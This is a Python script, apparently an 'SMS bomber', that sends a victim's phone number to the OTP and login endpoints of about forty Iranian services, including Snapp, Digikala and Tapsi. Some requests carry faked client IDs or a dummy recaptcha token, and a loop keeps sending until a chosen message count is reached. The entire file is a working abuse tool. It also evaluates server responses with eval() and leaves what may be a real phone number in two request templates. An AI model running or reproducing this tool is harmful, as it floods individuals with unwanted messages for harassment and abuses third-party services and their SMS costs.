import sys
import os
import requests
from random import choice
from colorama import Fore , Style , init
import time

str_without98and0=str

true=True
false=False
null=None
init()
class SMS_Api:
    class snapp:
        def sendSMS(phoneNumber:str_without98and0) -> str:
            phoneNumber="+98"+phoneNumber
            _json={"cellphone":phoneNumber}
            _url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
            req=requests.post(url=_url,json=_json)
            try:
                status=True if eval(req.text)["status"]=="OK" else False
            except:
                status=False
            return req.text,status
        def getURL() -> str:
            return "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
        def getJSON() -> dict:
            return {"cellphone":"+989XXXXXXXXX"}

    class divar:
        def sendSMS(phoneNumber:str_without98and0) -> str:
            phoneNumber=""+phoneNumber
            _json={"phone":phoneNumber}
            _url="https://api.divar.ir/v5/auth/authenticate"
            req=requests.post(url=_url,json=_json)
            try:
                status=True if eval(req.text)["authenticate_response"]=="AUTHENTICATION_VERIFICATION_CODE_SENT" else False
            except:
                status=False
            return req.text,status
        def getURL() -> str:
            return "https://api.divar.ir/v5/auth/authenticate"
        def getJSON() -> dict:
            return {"phone":"9XXXXXXXXX"}

    class digikala:
        def sendSMS(phoneNumber:str_without98and0) -> str:
            phoneNumber="0"+phoneNumber
            _json={"backUrl": "/", "username": phoneNumber, "otp_call": "false"}
            _url="https://api.digikala.com/v1/user/authenticate/"
            req=requests.post(url=_url,json=_json)
            try:
                status=True if eval(req.text)["status"]==200 else False
            except:
                status=False
            return req.text,status
        def getURL() -> str:
            return "https://api.digikala.com/v1/user/authenticate/"
        def getJSON() -> dict:
            return {"backUrl": "/", "username": "09XXXXXXXXX", "otp_call": "false"}
        
    class behtarino:
        def sendSMS(phoneNumber:str_without98and0) -> str:
            phoneNumber="0"+phoneNumber
            _json={"phone": phoneNumber}
            _url="https://bck.behtarino.com/api/v1/users/jwt_phone_verification/"
            req=requests.post(url=_url,json=_json)
            true=True
            try:
                status=True if eval(req.text)["data"]["ok"]==true else False
            except:
                status=False
            return req.text,status
        def getURL() -> str:
            return "https://bck.behtarino.com/api/v1/users/jwt_phone_verification/"
        def getJSON() -> dict:
            return {"phone": "09XXXXXXXXX"}

    class snappLink:
        def sendSMS(phoneNumber:str_without98and0) -> str:
            phoneNumber="0"+phoneNumber
            _json={"phone": phoneNumber}
            _url="https://api.snapp.ir/api/v1/sms/link"
            req=requests.post(url=_url,json=_json)
            try:
                status=True if eval(req.text)["message"]=="OK" else False
            except:
                status=False
            return req.text,status
        def getURL() -> str:
            return "https://api.snapp.ir/api/v1/sms/link"
        def getJSON() -> dict:
            return {"phone": "09XXXXXXXXX"}

    class football360:
        def sendSMS(phoneNumber:str_without98and0) -> str:
            phoneNumber="+98"+phoneNumber
            _json0={'phone_number': phoneNumber}
            true=True
            _url0="https://football360.ir/api/auth/v2/verify-phone/"
            req0=requests.post(url=_url0,json=_json0)
            otp_token=eval(req0.text)["results"]["otp_token"]
            _json={"phone_number": phoneNumber, "otp_token":otp_token}
            _url="https://football360.ir/api/auth/v2/send_otp/"
            req=requests.post(url=_url,json=_json)
            try:
                status=True if eval(req.text)["message"]=="OTP has been sent." else False
            except:
                status=False
            return req.text,status
        def getURL() -> str:
            return "https://football360.ir/api/auth/v2/send_otp/"
        def getJSON() -> dict:
            return {'phone_number': "+989XXXXXXXXX"}    
        
    class bargheman:
        def sendSMS(phoneNumber:str_without98and0) -> str:
            phoneNumber="0"+phoneNumber
            _json={"mobile": phoneNumber, "from_meter_buy": False}
            _url="https://uiapi2.saapa.ir/api/otp/sendCode"
            req=requests.post(url=_url,json=_json)
            try:
                status=True if eval(req.text)["message"]=="عملیات با موفقیت انجام شد" else False
            except:
                status=False
            return req.text,status
        def getURL() -> str:
            return "https://uiapi2.saapa.ir/api/otp/sendCode"
        def getJSON() -> dict:
            return {"mobile": "09XXXXXXXXX", "from_meter_buy": False}    
            
    class bazar:
        def sendSMS(phoneNumber:str_without98and0) -> str:
            phoneNumber="98"+phoneNumber
            fakeClientID=""
            for i in range(5):
                fakeClientID=choice("abcdefghijklmnopqrstuvwxyz")
            fakeClientID=f"217{fakeClientID}4m3afbr6n1nfzwtyucg"
            _json={
                        "properties": {
                            "language": 2,
                            "clientID": fakeClientID,
                            "deviceID": fakeClientID,
                            "clientVersion": "web"
                        },
                        "singleRequest": {
                            "getOtpTokenRequest": {
                                "username": phoneNumber
                            }
                        }
                    }
            _url="https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest"
            req=requests.post(url=_url,json=_json)
            try:
                status=True if eval(req.text)["properties"]["statusCode"]==200 else False
            except:
                status=False
            return req.text,status
        def getURL() -> str:
            return "https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest"
        def getJSON() -> dict:
            return {"properties": {"language": "2","clientID": "217qzdpwkoszf4m3afbr6n1nfzwtyucg","deviceID": "217qzdpwkoszf4m3afbr6n1nfzwtyucg","clientVersion": "web"},"singleRequest": {"getOtpTokenRequest": {"username": "989XXXXXXXXX"}}}

    class ostadkar:
        def sendSMS(phoneNumber:str_without98and0) -> str:
            phoneNumber="0"+phoneNumber
            _json={'mobile': phoneNumber}
            _url="https://api.ostadkr.com/login"
            req=requests.post(url=_url,json=_json)
            try:
                status=True if eval(req.text)["duration"]==90 else False
            except:
                status=False
            return req.text,status
        def getURL() -> str:
            return "https://api.ostadkr.com/login"
        def getJSON() -> dict:
            return {'mobile': "09XXXXXXXXX"}

    class telewebion:
        def sendSMS(phoneNumber:str_without98and0) -> str:
            phoneNumber=""+phoneNumber
            _json={"code": "98", "phone": phoneNumber, "smsStatus": "default"}
            _url="https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one"
            req=requests.post(url=_url,json=_json)
            try:
                status=True if eval(req.text)["waiting"]==60 else False
            except:
                status=False
            return req.text,status
        def getURL() -> str:
            return "https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one"
        def getJSON() -> dict:
            return {"code": "98", "phone": "9XXXXXXXXX", "smsStatus": "default"}
        
    class torob:
        def sendSMS(phoneNumber:str_without98and0) -> str:
            phoneNumber="0"+phoneNumber
            _url="https://api.torob.com/v4/user/phone/send-pin/?phone_number="+phoneNumber
            req=requests.get(url=_url)
            try:
                status=True if eval(req.text)["message"]=="pin code sent" else False
            except:
                status=False
            return req.text,status
        def getURL() -> str:
            return "https://api.torob.com/v4/user/phone/send-pin/?phone_number="

    class karnameh:
        def sendSMS(phoneNumber:str_without98and0) -> str:
            phoneNumber="0"+phoneNumber
            _json={"phone": phoneNumber}
            _url="https://api.karnameh.com/v1/carinspection/auth/authenticate"
            req=requests.post(url=_url,json=_json)
            try:
                status=True if eval(req.text)["authenticate_response"]=="AUTHENTICATION_VERIFICATION_CODE_SENT" else False
            except:
                status=False
            return req.text,status
        def getURL() -> str:
            return "https://api.karnameh.com/v1/carinspection/auth/authenticate"
        def getJSON() -> dict:
            return {"phone": "09XXXXXXXXX"}

    class alibaba:
        def sendSMS(phoneNumber:str_without98and0) -> str:
            phoneNumber="0"+phoneNumber
            _json={"phoneNumber": phoneNumber}
            _url="https://ws.alibaba.ir/api/v3/account/mobile/otp"
            req=requests.post(url=_url,json=_json)
            try:
                status=True if eval(req.text)["message"]=="پیامک حاوی کد یکبار مصرف برای شما ارسال شده است." else False
            except:
                status=False
            return req.text,status
        def getURL() -> str:
            return "https://ws.alibaba.ir/api/v3/account/mobile/otp"
        def getJSON() -> dict:
            return {"phoneNumber": "09XXXXXXXXX"}

    class okala:
        def sendSMS(phoneNumber:str_without98and0) -> str:
            phoneNumber="0"+phoneNumber
            _json={"mobile": phoneNumber, "deviceTypeCode": 0, "confirmTerms": True, "notRobot": False}
            _url="https://api-react.okala.com/C/CustomerAccount/OTPRegister"
            req=requests.post(url=_url,json=_json)
            try:
                status=True if eval(req.text)["success"]==true else False
            except:
                status=False
            return req.text,status
        def getURL() -> str:
            return "https://api-react.okala.com/C/CustomerAccount/OTPRegister"
        def getJSON() -> dict:
            return {"mobile": "09XXXXXXXXX", "deviceTypeCode": 0, "confirmTerms": True, "notRobot": False}

    class zhaket:
        def sendSMS(phoneNumber:str_without98and0) -> str:
            phoneNumber="98"+phoneNumber
            _json={"phone":phoneNumber}
            _url="https://api.zhaket.com/public/user/verify"
            req=requests.post(url=_url,json=_json)
            try:
                status=True if eval(req.text)["success"]==true else False
            except:
                status=False
            return req.text,status
        def getURL() -> str:
            return "https://api.zhaket.com/public/user/verify"
        def getJSON() -> dict:
            return {"phone":"989XXXXXXXXX"}
        
    class iranecar:
        def sendSMS(phoneNumber:str_without98and0) -> str:
            phoneNumber="0"+phoneNumber
            _json={"mobile":phoneNumber}
            _url="https://api.iranecar.com/identity/api/v1/User/GenerateOTP"
            req=requests.post(url=_url,json=_json)
            try:
                status=True if eval(req.text)["messages"]==[f"کد تایید به شماره موبایل {phoneNumber} ارسال شد."] else False
            except:
                status=False
            return req.text,status
        def getURL() -> str:
            return "https://api.iranecar.com/identity/api/v1/User/GenerateOTP"
        def getJSON() -> dict:
            return {"mobile":"09XXXXXXXXX"}
            
    class anten:
        def sendSMS(phoneNumber:str_without98and0) -> str:
            phoneNumber="0"+phoneNumber
            _json={"phone":phoneNumber}
            _url="https://api2.anten.ir/ids/api/auth/register"
            req=requests.post(url=_url,json=_json)
            try:
                status=True if type(eval(req.text)["id"])==int else False
            except:
                status=False
            return req.text,status
        def getURL() -> str:
            return "https://api2.anten.ir/ids/api/auth/register"
        def getJSON() -> dict:
            return {"phone":"09XXXXXXXXX"}

    class tapsi:
        def sendSMS(phoneNumber:str_without98and0) -> str:
            phoneNumber="0"+phoneNumber
            _json={"credential":{"phoneNumber":phoneNumber,"role":"PASSENGER"},"otpOption":"SMS"}
            _url="https://api.tapsi.cab/api/v2.2/user"
            req=requests.post(url=_url,json=_json)
            try:
                status=True if eval(req.text)["result"]=="OK" else False
            except:
                status=False
            return req.text,status
        def getURL() -> str:
            return "https://api.tapsi.cab/api/v2.2/user"
        def getJSON() -> dict:
            return {"credential":{"phoneNumber":"09XXXXXXXXX","role":"PASSENGER"},"otpOption":"SMS"}
  
    class esam:
        def sendSMS(phoneNumber:str_without98and0) -> str:
            phoneNumber="0"+phoneNumber
            _json={"mobile":phoneNumber,"present_type":"WebApp","registration_method":0,"serialNumber":""}
            _url="https://api.esam.ir/api/account/RegisterOrLogin"
            req=requests.post(url=_url,json=_json)
            try:
                status=True if eval(req.text)["statusCode"]==0 else False
            except:
                status=False
            return req.text,status
        def getURL() -> str:
            return "https://api.esam.ir/api/account/RegisterOrLogin"
        def getJSON() -> dict:
            return {"mobile":"09XXXXXXXXX","present_type":"WebApp","registration_method":0,"serialNumber":""}          

    class banimode:
        def sendSMS(phoneNumber:str_without98and0) -> str:
            phoneNumber="0"+phoneNumber
            _json={"phone":phoneNumber}
            _url="https://mobapi.banimode.com/api/v2/auth/request"
            req=requests.post(url=_url,json=_json)
            try:
                status=True if eval(req.text)["status"]=="success" else False
            except:
                status=False
            return req.text,status
        def getURL() -> str:
            return "https://mobapi.banimode.com/api/v2/auth/request"
        def getJSON() -> dict:
            return {"phone":"09XXXXXXXXX"}
        
    class idpay:
        def sendSMS(phoneNumber:str_without98and0) -> str:
            true=True
            false=False
            null=None
            phoneNumber="0"+phoneNumber
            _json0={"username":phoneNumber}
            _url0="https://panel.idpay.ir/api/v1/user/authenticate"
            req0=requests.post(url=_url0,json=_json0)
            _json={"number":phoneNumber,"type":"register"} if eval(req0.text)["new"] else {"number":phoneNumber,"type":"login"}
            _url="https://panel.idpay.ir/api/v1/user/verification"
            req=requests.post(url=_url,json=_json)
            try:
                status=True if eval(req.text)["type"]=="sms" else False
            except:
                status=False
            return req.text,status
        def getURL() -> str:
            return "https://panel.idpay.ir/api/v1/user/authenticate","https://panel.idpay.ir/api/v1/user/verification"
        def getJSON() -> dict:
            return {"username":"09XXXXXXXXX"},{"number":"09XXXXXXXXX","type":"register"}

    class nobat:
        def sendSMS(phoneNumber:str_without98and0) -> str:
            phoneNumber=""+phoneNumber
            _json={"mobile": phoneNumber,"use_emta_v2": "yes","domain": "nobat"}
            _url="https://nobat.ir/api/public/patient/login/phone"
            req=requests.post(url=_url,data=_json)
            try:
                status=True if eval(req.text)["status"]=="success" else False
            except:
                status=False
            return req.text,status
        def getURL() -> str:
            return "https://nobat.ir/api/public/patient/login/phone"
        def getJSON() -> dict:
            return {"mobile": "9XXXXXXXXX","use_emta_v2": "yes","domain": "nobat"}
        
    class basalam:
            def sendSMS(phoneNumber:str_without98and0) -> str:
                phoneNumber="0"+phoneNumber
                _json={"mobile":phoneNumber,"client_id":11}
                _url="https://auth.basalam.com/otp-request"
                req=requests.post(url=_url,json=_json)
                try:
                    status=True if eval(req.text)["message"]=="Okay" else False
                except:
                    status=False
                return req.text,status
            def getURL() -> str:
                return "https://auth.basalam.com/otp-request"
            def getJSON() -> dict:
                return {"mobile":"09XXXXXXXXX","client_id":11}
            
    class azkivam:
        def sendSMS(phoneNumber:str_without98and0) -> str:
            phoneNumber="0"+phoneNumber
            _json={"mobileNumber": phoneNumber,"source": "google"}
            _url="https://api.azkivam.com/auth/login"
            req=requests.post(url=_url,json=_json)
            try:
                status=True if eval(req.text)["rsCode"]==0 else False
            except:
                status=False
            return req.text,status
        def getURL() -> str:
            return "https://api.azkivam.com/auth/login"
        def getJSON() -> dict:
            return {"mobileNumber": '09XXXXXXXXX',"source": "google"}

    class vitrin:
        def sendSMS(phoneNumber:str_without98and0) -> str:
            phoneNumber="0"+phoneNumber
            _json={"phone_number": phoneNumber, "forgot_password": false}
            _url="https://www.vitrin.shop/api/v1/user/request_code"
            req=requests.post(url=_url,json=_json)
            try:
                status=True if eval(req.text)["message"]==f"کد احراز هویت با موفقیت به شماره تلفن {phoneNumber} ارسال شد" else False
            except:
                status=False
            return req.text,status
        def getURL() -> str:
            return "https://www.vitrin.shop/api/v1/user/request_code"
        def getJSON() -> dict:
            return {"phone_number": '09XXXXXXXXX', "forgot_password": false}
        
    class shab:
        def sendSMS(phoneNumber:str_without98and0) -> str:
            phoneNumber="0"+phoneNumber
            _json={'mobile': phoneNumber, 'country_code': '+98'}
            _url="https://api.shab.rentals/api/fa/sandbox/v_1_4/auth/login-otp"
            req=requests.post(url=_url,json=_json)
            try:
                status=True if eval(req.text)["meta"]['status']==200 else False
            except:
                status=False
            return req.text,status
        def getURL() -> str:
            return "https://api.shab.rentals/api/fa/sandbox/v_1_4/auth/login-otp"
        def getJSON() -> dict:
            return {'mobile': '09XXXXXXXXX', 'country_code': '+98'}

    class snapptrip:
        def sendSMS(phoneNumber:str_without98and0) -> str:
            phoneNumber="0"+phoneNumber
            _json={'phoneNumber': phoneNumber}
            _url="https://platform-api.snapptrip.com/profile/auth/request-otp"
            req=requests.post(url=_url,json=_json)
            try:
                status=True if eval(req.text)["message"]==f"کد ورود به شماره {phoneNumber} ارسال شد." else False
            except:
                status=False
            return req.text,status
        def getURL() -> str:
            return "https://platform-api.snapptrip.com/profile/auth/request-otp"
        def getJSON() -> dict:
            return {'phoneNumber': '09XXXXXXXXX'}

    class shavaz:
        def sendSMS(phoneNumber:str_without98and0) -> str:
            phoneNumber="0"+phoneNumber
            _json={'phone_number': phoneNumber}
            _url="https://rest.shavaz.com/api/v1/auth/user/send/otp"
            req=requests.post(url=_url,json=_json)
            try:
                status=True if eval(req.text)["status"]=="Success" else False
            except:
                status=False
            return req.text,status
        def getURL() -> str:
            return "https://rest.shavaz.com/api/v1/auth/user/send/otp"
        def getJSON() -> dict:
            return {'phone_number': '09XXXXXXXXX'}

    class jabama:
        def sendSMS(phoneNumber:str_without98and0) -> str:
            phoneNumber="0"+phoneNumber
            _json={'mobile': phoneNumber}
            _url="https://gw.jabama.com/api/v4/account/send-code"
            req=requests.post(url=_url,json=_json)
            try:
                status=True if eval(req.text)["success"]==true else False
            except:
                status=False
            return req.text,status
        def getURL() -> str:
            return "https://gw.jabama.com/api/v4/account/send-code"
        def getJSON() -> dict:
            return {'mobile': '09XXXXXXXXX'}
        
    class takhfifan:
        def sendSMS(phoneNumber:str_without98and0) -> str:
            phoneNumber="0"+phoneNumber
            _json={"username": phoneNumber}
            _url="https://takhfifan.com/v6/api/magento/login/init"
            req=requests.post(url=_url,json=_json)
            try:
                status=True if eval(req.text)["state"]=="register_using_otp" else False
            except:
                status=False
            return req.text,status
        def getURL() -> str:
            return "https://takhfifan.com/v6/api/magento/login/init"
        def getJSON() -> dict:
            return {'username': '09XXXXXXXXX'}
        
    class tapsiShop:
        def sendSMS(phoneNumber:str_without98and0) -> str:
            phoneNumber="0"+phoneNumber
            _json={'user': phoneNumber}
            _url="https://ids.tapsi.shop/authCustomer/CreateOtpForRegister"
            req=requests.post(url=_url,json=_json)
            try:
                status=True if eval(req.text)["success"]==true else False
            except:
                status=False
            return req.text,status
        def getURL() -> str:
            return "https://ids.tapsi.shop/authCustomer/CreateOtpForRegister"
        def getJSON() -> dict:
            return {'user': '09XXXXXXXXX'}
        
    class melico:
        def sendSMS(phoneNumber:str_without98and0) -> str:
            phoneNumber="0"+phoneNumber
            _json={"username": phoneNumber, "group": "my", "recaptcha_token": "abcd"}
            _url="https://melico.ir/auth/check-user"
            req=requests.post(url=_url,json=_json)
            try:
                status=True if eval(req.text)["is_exist"]==False else False
            except:
                status=False
            return req.text,status
        def getURL() -> str:
            return "https://melico.ir/auth/check-user"
        def getJSON() -> dict:
            return {"username": '09XXXXXXXXX', "group": "my", "recaptcha_token": "abcd"}
        
    class neshan:
        def sendSMS(phoneNumber:str_without98and0) -> str:
            phoneNumber="0"+phoneNumber
            _json={}
            _url=f"https://neshan.org/maps/pwa-api/login/sms/request?mobileNumber={phoneNumber}&uuid=web_0194079f-5bbd-7416-a3c1-15f728c51688"
            req=requests.get(url=_url)
            try:
                status=True
            except:
                status=False
            return req.text,status
        def getURL() -> str:
            return "https://neshan.org/maps/pwa-api/login/sms/request?mobileNumber={phone}&uuid=web_0194079f-5bbd-7416-a3c1-15f728c51688"
        def getJSON() -> dict:
            return {}

    class drnext:
        def sendSMS(phoneNumber:str_without98and0) -> str:
            phoneNumber="0"+phoneNumber
            _json={"source": "besina","mobile": phoneNumber,"key": "U2FsdGVkX1++A0strhKO558R9koy8IK7iq3K24q+KJeJurpeLZ+ubZujzk8uQ1NM/lZg0X0DAoFgyaRRGBVxSQ=="}
            unBot=requests.get(url=f"https://cyclops.drnext.ir/v1/website/patients/check-patient-exists-by-mobile?mobile={phoneNumber}")
            _url="https://cyclops.drnext.ir/v1/patients/auth/send-verification-token"
            req=requests.post(url=_url,json=_json)
            try:
                status=True if eval(req.text)["success"]==True else False
            except:
                status=False
            return req.text,status
        def getURL() -> str:
            return "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token"
        def getJSON() -> dict:
            return {"source": "besina","mobile": "09XXXXXXXXX","key": "U2FsdGVkX1++A0strhKO558R9koy8IK7iq3K24q+KJeJurpeLZ+ubZujzk8uQ1NM/lZg0X0DAoFgyaRRGBVxSQ=="}
        
    class karabiz:
        def sendSMS(phoneNumber:str_without98and0) -> str:
            phoneNumber="0"+phoneNumber
            _json={'Mobile': phoneNumber, 'SchoolId': -1, 'url': 'panel.karabiz.ir', 'identifierCode':""}
            _url="https://panel.karabiz.ir/api/api/user/signup"
            req=requests.post(url=_url,json=_json)
            try:
                status=True if req.text=='""' else False
            except:
                status=False
            return req.text,status
        def getURL() -> str:
            return "https://panel.karabiz.ir/api/api/user/signup"
        def getJSON() -> dict:
            return {'Mobile': '09XXXXXXXXX', 'SchoolId': -1, 'url': 'panel.karabiz.ir', 'identifierCode':""}
        
    class balad:
        def sendSMS(phoneNumber:str_without98and0) -> str:
            phoneNumber="0"+phoneNumber
            _json={"phone_number": phoneNumber,"os_type": "W"}
            _url="https://account.api.balad.ir/api/web/auth/login/"
            req=requests.post(url=_url,json=_json)
            try:
                status=True if eval(req.text)["result"]=="success" else False
            except:
                status=False
            return req.text,status
        def getURL() -> str:
            return "https://account.api.balad.ir/api/web/auth/login/"
        def getJSON() -> dict:
            return {"phone_number": "09214065420","os_type": "W"}  
              
    class mohit:
        def sendSMS(phoneNumber:str_without98and0) -> str:
            phoneNumber="0"+phoneNumber
            _json={"username": phoneNumber,"app": "market"}
            _url="https://api.mohit.online/api/auth/login"
            req=requests.post(url=_url,json=_json)
            try:
                status=True if eval(req.text)["success"]==true else False
            except:
                status=False
            return req.text,status
        def getURL() -> str:
            return "https://api.mohit.online/api/auth/login"
        def getJSON() -> dict:
            return {"username": '09XXXXXXXXX',"app": "market"}
        
    class ibime:
        def sendSMS(phoneNumber:str_without98and0) -> str:
            phoneNumber="0"+phoneNumber
            _json={"phoneNumber": phoneNumber}
            _url="https://api.ibime.com/web/v1/account/otp"
            req=requests.post(url=_url,json=_json)
            try:
                status=True if ""=="" else False
            except:
                status=False
            return req.text,status
        def getURL() -> str:
            return "https://api.ibime.com/web/v1/account/otp"
        def getJSON() -> dict:
            return {"phoneNumber": '09XXXXXXXXX'}

    class erythron:
        def sendSMS(phoneNumber:str_without98and0) -> str:
            phoneNumber="0"+phoneNumber
            _json={"auth_type": "mobile","auth_value": phoneNumber}
            _url="https://api.erythron.net/v1/user/getVerifyCode"
            req=requests.post(url=_url,json=_json)
            try:
                status=True if eval(req.text)["success"]==True else False
            except:
                status=False
            return req.text,status
        def getURL() -> str:
            return "https://api.erythron.net/v1/user/getVerifyCode"
        def getJSON() -> dict:
            return {"auth_type": "mobile","auth_value": "09XXXXXXXXX"}
        
    class tetherland:
        def sendSMS(phoneNumber:str_without98and0) -> str:
            phoneNumber="0"+phoneNumber
            _json={"mobile": phoneNumber,"device_info": {"brand": "","model": "","browserVersion": "131.0.0.0","app_version": "","by": "web","osName": "Windows","osVersion": "10","browserName": "Chrome","platform": "web","name": "Windows","device": "web"},"otp_type": "sms","device": "web"}
            _url="https://service.tetherland.com/api/v5/login-register"
            req=requests.post(url=_url,json=_json)
            try:
                status=True if eval(req.text)["status"]==True else False
            except:
                status=False
            return req.text,status
        def getURL() -> str:
            return "https://service.tetherland.com/api/v5/login-register"
        def getJSON() -> dict:
            return {"mobile": "09214065420","device_info": {"brand": "","model": "","browserVersion": "131.0.0.0","app_version": "","by": "web","osName": "Windows","osVersion": "10","browserName": "Chrome","platform": "web","name": "Windows","device": "web"},"otp_type": "sms","device": "web"}

    class run:
                                
        def oneTime(phoneNumber:str_without98and0) -> str:
            classes=["snapp",
                "divar",
                "digikala",
                "behtarino",
                "snappLink",
                "football360",
                "bargheman",
                "bazar",
                "ostadkar",
                "telewebion",
                "torob",
                "karnameh",
                "alibaba",
                "okala",
                "zhaket",
                "iranecar",
                "anten",
                "tapsi",
                "esam",
                "banimode",
                "idpay",
                "nobat",
                "basalam",
                "azkivam",
                "vitrin",
                "shab",
                "snapptrip",
                "shavaz",
                "jabama",
                "takhfifan",
                "tapsiShop",
                "melico",
                "neshan",
                "drnext",
                "karabiz",
                "balad",
                "mohit",
                "ibime",
                "erythron",
                "tetherland"
                ]
            output=""
            for i in classes:
                try:
                    if eval("SMS_Api."+i).sendSMS(phoneNumber)[1]:
                        output+= i + " was send\n"
                        output+=","
                    else:
                        output+= i + " don't send\n"
                        output+=","
                except:
                    output+= i + " was error\n"
                    output+=","
            return output

        def run(phoneNumber:str_without98and0,times:int):
            output=""
            for i in range(times):
                output+=SMS_Api.run.oneTime(phoneNumber)
            return output
    
        def runInTerminal():
            def bar(smsSent,sms,output):
                os.system("cls")
                percent = (smsSent / sms) * 100
                if smsSent < sms:
                    bar =Fore.RED + '█' * smsSent + '-' * (sms - smsSent)
                    sys.stdout.write(Fore.RED + f'\r{str(smsSent)}\{str(sms)}|{bar}| {percent:.2f}%')
                    print(output)
                else:
                    os.system("cls")
                    print(output)
                    bar =Fore.GREEN + '█' * smsSent + '-' * (sms - smsSent)
                    sys.stdout.write(Fore.GREEN + f'\r|{bar}| {percent:.2f}%')
                    print("\nMission completed...")
                sys.stdout.flush()
                time.sleep(0.1)
            webs=["snapp",
                "divar",
                "digikala",
                "behtarino",
                "snappLink",
                "football360",
                "bargheman",
                "bazar",
                "ostadkar",
                "telewebion",
                "torob",
                "karnameh",
                "alibaba",
                "okala",
                "zhaket",
                "iranecar",
                "anten",
                "tapsi",
                "esam",
                "banimode",
                "idpay",
                "nobat",
                "basalam",
                "azkivam",
                "vitrin",
                "shab",
                "snapptrip",
                "shavaz",
                "jabama",
                "takhfifan",
                "tapsiShop",
                "melico",
                "neshan",
                "drnext",
                "karabiz",
                "balad",
                "mohit",
                "ibime",
                "erythron",
                "tetherland"
                ]
            active_webs=[]
            os.system("cls")
            phone=input("Enter phone number:")
            sms=int(input("Number of SMS:"))
            os.system("cls")
            smsSent=0
            output=""
            while sms>smsSent:
                for i in webs:
                    if sms>smsSent:
                        try:
                            if eval("SMS_Api."+i).sendSMS(phone)[1]:
                                smsSent+=1
                                output+="\n"+Fore.GREEN+str(smsSent)+"." + i + " was sent"
                                bar(smsSent,sms,output)
                                active_webs.append(i)
                            else:
                                output+="\n"+Fore.RED+ i + " was not sent"
                                bar(smsSent,sms,output)
                        except:
                            output+="\n"+Fore.LIGHTRED_EX + i + " was error"
                            bar(smsSent,sms,output)
                    else:
                        break
                webs=active_webs
            print(Style.RESET_ALL)

SMS_Api.run.runInTerminal()